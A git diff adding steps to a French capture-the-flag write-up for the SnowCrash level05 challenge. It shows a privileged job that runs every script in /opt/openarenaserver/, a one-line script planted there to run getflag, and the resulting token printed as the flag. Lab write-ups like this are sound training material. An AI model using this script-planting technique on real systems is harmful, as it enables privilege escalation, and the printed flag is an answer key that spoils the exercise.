@@ -1,4 +1,9 @@
 # LEVEL 06
+- On test le usual:
+```
+level05@SnowCrash:~$ ls -l
+total 0
+```
 - On cherche les fichiers du user Level05
 ```
 find / -name level05 2>&-
@@ -21,9 +26,16 @@ for i in /opt/openarenaserver/* ; do
 done
 ```
 
-- Ce script execute tous les scripts presents dans /opt/openarenaserver/, on y créer donc notre script bash pour executer la commande getflag
+- Ce script execute tous les scripts presents dans /opt/openarenaserver/, on y créer donc notre script bash pour executer la commande getflag:
+```
+echo "getflag > /var/crash/flag05" > /opt/openarenaserver/lol
+```
+Wait two minutes....
 
 ```
 cat /var/crash/flag05
 Check flag.Here is your token : viuaaale9huek52boumoomioc
 ```
+
+## ⚡ Flag
+`viuaaale9huek52boumoomioc`
